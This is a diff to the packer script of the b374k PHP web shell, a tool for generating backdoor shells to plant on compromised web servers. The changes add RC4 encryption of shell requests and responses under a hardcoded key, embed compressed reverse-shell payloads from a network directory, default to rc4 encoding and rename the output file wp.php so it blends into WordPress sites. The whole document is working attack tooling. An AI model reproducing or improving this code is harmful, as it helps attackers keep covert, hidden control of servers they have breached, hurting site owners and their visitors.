@@ -10,7 +10,7 @@
 	https://github.com/phith0n/b374k
 */
 $GLOBALS['packer']['title'] = "b374k shell packer";
-$GLOBALS['packer']['version'] = "0.4.6";
+$GLOBALS['packer']['version'] = "0.4.7";
 $GLOBALS['packer']['base_dir'] = "./base/";
 $GLOBALS['packer']['module_dir'] = "./module/";
 $GLOBALS['packer']['theme_dir'] = "./theme/";
@@ -18,7 +18,8 @@ $GLOBALS['packer']['module'] = packer_get_module();
 $GLOBALS['packer']['theme'] = packer_get_theme();
 $GLOBALS['packer']['network_rs_dir'] = "./network/rs/";
 $GLOBALS['packer']['resources_dir'] = "./resources/";
-$GLOBALS['cipher_key'] = generateRandomString(32);
+
+$debug_rc4_key = "QtIRzust76zO1haRabFYkbBv9WDnGvTx";
 
 require $GLOBALS['packer']['base_dir'].'jsPacker.php';
 
@@ -48,8 +49,6 @@ $module_code = packer_read_file($GLOBALS['packer']['base_dir']."base.php");
 /* JAVASCRIPT AND CSS FILES START */
 $zepto_code = packer_read_file($GLOBALS['packer']['base_dir']."zepto.js");
 $js_main_code = "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."main.js");
-$js_local_code = "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."localmain.js");
-
 
 if(isset($_COOKIE['packer_theme']))	$theme = $_COOKIE['packer_theme'];
 else $theme ="default";
@@ -59,9 +58,11 @@ $css_code = packer_read_file($GLOBALS['packer']['theme_dir'].$theme.".css");
 
 // layout
 $layout = packer_read_file($GLOBALS['packer']['base_dir']."layout.php");
-$p = array_map("rawurldecode", packer_get_post());
 
 if(isset($_SERVER['REMOTE_ADDR'])){
+    $GLOBALS['cipher_key'] = $debug_rc4_key;
+    $p = array_map("rawurldecode", packer_get_post());
+
 	if(isset($p['read_file'])){
 		$file = $p['read_file'];
 		if(is_file($file)){
@@ -77,7 +78,7 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 		$module_arr = array_map("packer_wrap_with_quote", $module_arr);
 		$module_init = "\n\$GLOBALS['module_to_load'] = array(".implode(", ", $module_arr).");";
 
-		$js_code = "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."sortable.js").$js_local_code;
+		$js_code = "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."sortable.js").$js_main_code;
 		$js_code .= "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."base.js");
 
 		foreach($modules as $module){
@@ -91,12 +92,13 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 		$layout = str_replace("<__ZEPTO__>", $zepto_code, $layout);
 		$layout = str_replace("<__JS__>", $js_code, $layout);
 
-		$base_code .= packer_read_file($GLOBALS['packer']['base_dir']."localmain.php");
+		$base_code .= packer_read_file($GLOBALS['packer']['base_dir']."main.php");
 		$rs_content = trim($module_init)."?>".$base_code.$module_code.$layout;
 		eval($rs_content);
 		die();
 	}
 	elseif(isset($p['outputfile'])&&isset($p['password'])&&isset($p['module'])&&isset($p['strip'])&&isset($p['base64'])&&isset($p['compress'])&&isset($p['compress_level'])&&isset($p['encode'])){
+        $GLOBALS['cipher_key'] = generateRandomString(32);
 		$outputfile = trim($p['outputfile']);
 		if(empty($outputfile)) $outputfile = 'b374k.php';
 		$password = trim($p['password']);
@@ -118,13 +120,30 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 		$js_code = "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."sortable.js").$js_main_code;
 		$js_code .= "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."base.js");
 
-		foreach($modules as $module){
-			$module = trim($module);
-			$filename = $GLOBALS['packer']['module_dir'].$module;
-			if(is_file($filename.".php")) $module_code .= packer_read_file($filename.".php");
-			if(is_file($filename.".js")) $js_code .= "\n".packer_read_file($filename.".js")."\n";
+        foreach($modules as $module){
+            $module = trim($module);
+            $filename = $GLOBALS['packer']['module_dir'].$module;
+            if(is_file($filename.".php")) {
+                $php_data = packer_read_file($filename.".php");
 
-		}
+                if($module == 'network') {
+                    $files = scandir($GLOBALS['packer']['network_rs_dir']);
+                    $rs_content = "";
+                    foreach($files as $rs) {
+                        if(!in_array($rs, array(".",".."))) {
+                            $rs_data = packer_read_file($GLOBALS['packer']['network_rs_dir'] . $rs);
+                            $rs_content .= "\$GLOBALS['resources']['rs_" . pathinfo($rs, PATHINFO_FILENAME) . "'] = '" . base64_encode(gzdeflate($rs_data, 9)) . "';\n";
+                        }
+                    }
+                    $php_data = str_replace("//<__RS__>", $rs_content, $php_data);
+                }
+
+                $module_code .= $php_data;
+            }
+            if(is_file($filename.".js")) {
+                $js_code .= "\n".packer_read_file($filename.".js")."\n";
+            }
+        }
 
 		$layout = str_replace("<__CIPHER_KEY__>", $GLOBALS['cipher_key'], $layout);
 		$layout = str_replace("<__CSS__>", $css_code, $layout);
@@ -133,15 +152,15 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 		if($strip=='yes') $js_code = packer_pack_js($js_code);
 		$layout = str_replace("<__JS__>", $js_code, $layout);
 
-
 		$htmlcode = trim($layout);
 		$base_code .= packer_read_file($GLOBALS['packer']['base_dir']."main.php");
 		$phpcode = "<?php \$GLOBALS['encode']='{$encode}';".trim($module_init)."?>".trim($base_code).trim($module_code);
 
-		packer_output(packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password));
+		$str = packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password);
+        $GLOBALS['cipher_key'] = $debug_rc4_key;
+		packer_output($str);
 	}
 	else{
-	
 	$available_themes = "<tr><td>Theme</td><td><select class='theme' style='width:150px;'>";
 	foreach($GLOBALS['packer']['theme'] as $k){
 		if($k==$theme) $available_themes .= "<option selected='selected'>".$k."</option>";
@@ -182,7 +201,7 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 		<br>
 		<table class='boxtbl'>
 			<tr><th colspan='2'><p class='boxtitle'>Pack</p></th></tr>
-			<tr><td style='width:220px;'>Output</td><td><input id='outputfile' type='text' value='b374k.php'></td></tr>
+			<tr><td style='width:220px;'>Output</td><td><input id='outputfile' type='text' value='wp.php'></td></tr>
 			<tr><td>Password</td><td><input id='password' type='text' value='b374k'></td></tr>
 			<tr><td>Module (separated by comma)</td><td><input type='text' id='module_to_pack' value='<?php echo implode(",", $GLOBALS['packer']['module']);?>'></td></tr>
 			<?php echo $available_themes; ?>
@@ -206,7 +225,7 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 					<option selected="selected">gzdeflate</option>
 					<option>gzencode</option>
 					<option>gzcompress</option>
-                    <option>rc4</option>
+                    <option selected="selected">rc4</option>
 				</select>
 				<select id='compress_level' style='width:150px;'>
 					<option>1</option>
@@ -231,9 +250,10 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 	</div>
 
 	<script type='text/javascript'>
+    window['cipher_key'] = '<?php echo $GLOBALS['cipher_key'];?>';
 	var init_shell = false;
 	<?php echo $zepto_code;?>
-	<?php echo $js_local_code;?>
+	<?php echo $js_main_code;?>
 
 	var targeturl = '<?php echo packer_get_self(); ?>';
 	var debug = false;
@@ -262,7 +282,7 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 			encode = $('#encode').val();
 
 			send_post({outputfile:outputfile, password:password, module:module, strip:strip, base64:base64, compress:compress, compress_level:compress_level, encode:encode}, function(res){
-				splits = res.split('{[|b374k|]}');
+				var splits = res.split('{[|b374k|]}');
 				$('#resultContent').html(splits[1]);
 				$('#result').html(splits[0]);
 			});
@@ -314,7 +334,9 @@ else{
 		$opt = getopt("do:p:t:m:sbz:c:lku:");
 
         if (isset($opt['d'])) {
-            $GLOBALS['cipher_key'] = 'QtIRzust76zO1haRabFYkbBv9WDnGvTx';
+            $GLOBALS['cipher_key'] = $debug_rc4_key;
+        } else {
+            $GLOBALS['cipher_key'] = generateRandomString(32);
         }
 
 		if(isset($opt['l'])){
@@ -471,7 +493,17 @@ function packer_write_file($file, $content){
 }
 
 function packer_get_post(){
-	return packer_fix_magic_quote($_POST);
+    $post = packer_fix_magic_quote($_POST);
+    if(empty($_FILES) && is_ajax()) {
+        $post_str = rc4($GLOBALS['cipher_key'], hex2bin($post['args']));
+        parse_str($post_str, $post);
+        $post = packer_fix_magic_quote($post);
+    }
+    return $post;
+}
+
+function is_ajax() {
+    return isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest';
 }
 
 function packer_fix_magic_quote($arr){
@@ -499,7 +531,8 @@ function packer_output($str){
 	header("Content-Type: text/plain");
 	header("Cache-Control: no-cache");
 	header("Pragma: no-cache");
-	echo $str;
+    $str = @date("d M Y H:i:s",time()).'|'.$_SERVER['REMOTE_ADDR'].'|'.$str;
+    echo bin2hex(rc4($GLOBALS['cipher_key'], $str));
 	die();
 }
 
@@ -647,7 +680,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 	if(is_file($output)) unlink($output);
 	if(packer_write_file($output, $code)){
 		chmod($output, 0777);
-		return "Succeeded : <a href='".$output."' target='_blank'>[ ".$output." ] Filesize : ".filesize($output)."</a>{[|b374k|]}".packer_html_safe(trim($code));
+		return "Succeeded : [ <a href='".$output."' target='_blank'>".$output."</a> ] Filesize : ".filesize($output). ", RC4 Cipher Key : " . $GLOBALS['cipher_key'] ."{[|b374k|]}".packer_html_safe(trim($code));
 	}
 	return "error{[|b374k|]}";
 }
